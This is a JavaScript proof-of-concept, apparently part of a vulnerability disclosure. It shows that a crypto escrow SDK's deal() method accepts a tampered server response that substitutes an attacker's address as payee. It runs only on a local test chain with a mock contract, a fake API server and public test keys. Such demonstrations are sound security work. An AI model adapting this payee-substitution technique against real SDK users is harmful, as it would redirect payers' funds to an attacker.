// PoC: Bull SDK deal() (template path) does not verify the payee of the
// agreement it creates. A malicious/compromised API server can substitute
// the payee with an attacker address; the SDK accepts it silently and the
// payer's funds end up in an agreement payable to the attacker.
//
// Setup (all local, no real funds, no mainnet):
//   - fresh anvil, chain id 4663 (Bull's chain id)
//   - MockAgreement bytecode placed at the real Agreement address
//     (0xef9ceeb6594504ade1ec903a7a29a2bfe38efc8b) via anvil_setCode
//   - fake API server on localhost returning ONE tampered step
//   - the REAL live bull.mjs SDK (sha256 f92cb5e8..., downloaded 16 Nov 2026)
//
// The payer asks for payee = FRIEND. The server returns a step creating the
// agreement with payee = ATTACKER. The SDK's deal() only checks that the
// total amount held (sum) does not exceed what was asked for -- it never
// compares the payee (unlike agree(), which DOES check payer/payee).
import http from "node:http";
import fs from "node:fs";
import { createPublicClient, createWalletClient, defineChain, http as vhttp, encodeFunctionData, parseAbi } from "viem";
import { privateKeyToAccount } from "viem/accounts";
import { Bull } from "./bull-live.mjs";

const ANVIL = "http://127.0.0.1:8546";
const AGREEMENT = "0xef9ceeb6594504ade1ec903a7a29a2bfe38efc8b";
const PAYER_KEY = "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f3ff80"; // anvil account 0 (public test key)
const ATTACKER = "0x70997970C51812dc3A010C7d01b50e0d17dc79C8"; // anvil account 1
const FRIEND = "0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC"; // anvil account 2 (intended payee)
const ARBITER = "0x90F79bf6EB2c4f870365E785982E1f101E93b906"; // anvil account 3
const AMOUNT_WEI = 1000000000000000n; // 0.001 ETH

const MOCK_ABI = parseAbi(["function createAgreement(address payee, uint256 amount) payable returns (uint256)", "function payeeOf(uint256) view returns (address)"]);

// --- fake Bull API server: returns a TAMPERED step (payee = attacker) ---
const tamperedData = encodeFunctionData({ abi: MOCK_ABI, functionName: "createAgreement", args: [ATTACKER, AMOUNT_WEI] });
const server = http.createServer((req, res) => {
  let body = "";
  req.on("data", (c) => (body += c));
  req.on("end", () => {
    console.log("[fake API] " + req.method + " " + req.url + " body=" + body.slice(0, 200));
    res.writeHead(200, { "content-type": "application/json" });
    // The payer asked for payee=FRIEND. The server substitutes ATTACKER.
    res.end(JSON.stringify({ steps: [{ transaction: { to: AGREEMENT, data: tamperedData, value: "0x" + AMOUNT_WEI.toString(16) } }] }));
  });
});
await new Promise((r) => server.listen(8090, r));

// --- place the mock Agreement at the real Agreement address on local anvil ---
const mockRuntime = fs.readFileSync("./mock-runtime.txt", "utf8").trim();
const setCode = await fetch(ANVIL, { method: "POST", headers: { "content-type": "application/json" },
  body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "anvil_setCode", params: [AGREEMENT, mockRuntime] }) }).then((r) => r.json());
console.log("[setup] anvil_setCode:", JSON.stringify(setCode));

// --- run the REAL SDK against the fake server ---
const chain = defineChain({ id: 4663, name: "Robinhood Chain", nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 }, rpcUrls: { default: { http: [ANVIL] } } });
const account = privateKeyToAccount(PAYER_KEY);
const publicClient = createPublicClient({ chain, transport: vhttp(ANVIL) });
const walletClient = createWalletClient({ account, chain, transport: vhttp(ANVIL) });
const bull = new Bull({ walletClient, publicClient, baseUrl: "http://127.0.0.1:8090" });

console.log("[poc] payer asks deal() for payee = FRIEND (" + FRIEND + ")");
let id;
try {
  id = await bull.deal("arbiter_escrow", { payee: FRIEND, asset: "eth", amount: "0.001", arbiter: ARBITER, terms: "Deliver the report" });
  console.log("[poc] deal() returned id " + id + " WITHOUT throwing.");
} catch (e) {
  console.log("[poc] deal() THREW: " + e.message);
  process.exit(2);
}
const actualPayee = await publicClient.readContract({ address: AGREEMENT, abi: MOCK_ABI, functionName: "payeeOf", args: [BigInt(id)] });
console.log("[poc] intended payee: " + FRIEND);
console.log("[poc] actual on-chain payee: " + actualPayee);
console.log("[poc] attacker payee: " + ATTACKER);
if (actualPayee.toLowerCase() === ATTACKER.toLowerCase()) {
  console.log("RESULT: VULNERABLE — SDK accepted a tampered payee; payer funds are locked in an agreement payable to the attacker.");
} else {
  console.log("RESULT: NOT VULNERABLE — payee matches.");
}
server.close();
process.exit(0);
